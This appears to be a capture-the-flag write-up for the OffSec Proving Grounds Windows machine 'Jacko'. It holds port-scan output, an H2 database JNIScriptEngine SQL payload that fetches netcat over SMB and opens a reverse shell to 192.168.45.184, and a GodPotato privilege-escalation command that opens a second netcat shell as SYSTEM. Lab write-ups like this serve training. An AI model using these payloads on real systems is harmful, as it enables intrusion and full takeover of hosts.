# Jacko

## Info

Jacko is an intermediate windows machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
80/tcp    open     http          syn-ack ttl 125 Microsoft IIS httpd 10.0
135/tcp   open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack ttl 125
5040/tcp  open     unknown       syn-ack ttl 125
7680/tcp  open     pando-pub?    syn-ack ttl 125
8082/tcp  open     http          syn-ack ttl 125 H2 database http console
9092/tcp  open     XmlIpcRegSvc? syn-ack ttl 125
49664/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

## User

h2 database engine is vulnerable to the following searchsploit poc.

```
/usr/share/exploitdb/exploits/java/local/49384.txt
```

After connecting to my share using net use command, execute netcat and receive a shell.

```
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c \\\\192.168.45.184\\share\\nc64.exe 192.168.45.184 5040 -e cmd").getInputStream()).useDelimiter("\\Z").next()');
```

## Root

Only basic commands could be used with the shell as no path is set.

Finding privs with whoami.

```
C:\Windows\System32\whoami.exe /priv
```

Finding systeminfo.

```
C:\Windows\System32\systeminfo.exe
```

As tony has seImpersonatePrivilege enabled God Potato can be used to receive a shell as nt authority system.

```
.\potato.exe -cmd "C:\Users\tony\nc64.exe 192.168.45.184 7680 -e cmd"
```
